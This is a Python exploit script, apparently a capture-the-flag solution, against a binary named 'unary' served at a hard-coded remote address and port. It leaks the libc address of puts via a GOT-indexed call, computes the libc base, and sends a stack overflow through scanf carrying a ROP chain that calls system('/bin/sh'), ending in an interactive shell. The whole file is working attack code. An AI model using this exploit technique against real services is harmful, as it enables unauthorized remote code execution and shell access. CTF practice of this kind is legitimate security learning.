from ptrlib import *
# from pwn import *



def call(index, arg):
	sock.sendlineafter(": ", str(index))
	sock.sendlineafter("= ", str(arg))
	return

def ofs(addr):
	"""compute index for this address function"""

	return (addr - elf.symbol('ope')) // 8 + 1

libc = ELF("./libc-2.27.so")
elf = ELF("./unary")



# sock = Process("./unary")
sock = Socket("66.172.27.144", 9004)


# libc leak
print("ofs and address of puts function {}  {}".format(ofs(elf.got('puts')), elf.got('puts')))
#now we call puts function with its address arguement ---> so it prints puts address
call(ofs(elf.got('puts')), elf.got('puts'))
#libc.symbol('puts') -> this is offset when base is zero
libc_base = u64(sock.recvline()) - libc.symbol('puts')# this base change every time we run script
logger.info("libc = " + hex(libc_base))

# r = ROP(libc)
# print(str(r.find_gadget(['ret'])))
# res was :Gadget(0x8aa, ['ret'], [], 0x8)
rop_ret = libc_base + 0x000008aa
# logger.info("ropret is " + str(rop_ret))

# r = ROP(libc)
# print(str(r.find_gadget(['pop rdi', 'ret'])))
# res was : Gadget(0x2155f, ['pop rdi', 'ret'], ['rdi'], 0x10)
rop_pop_rdi = libc_base + 0x0002155f

# prepare rop chain
ofs_scanf = ofs(elf.got('__isoc99_scanf'))
# print(next(elf.find("%s")))
# all data is in 400000 
ofs_format = 0x400000 + next(elf.find("%s"))
# af first rsp is =  0x7fffffffe208 and rsi=r13=rsp+c= 0x7fffffffe1dc so the difference is  2c = 44
payload  = b'A' * (4 + 0x28)
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol('system'))
call(ofs_scanf, ofs_format)
sock.sendline(payload)

# get the shell!
sock.sendlineafter(": ", "0")

sock.interactive()













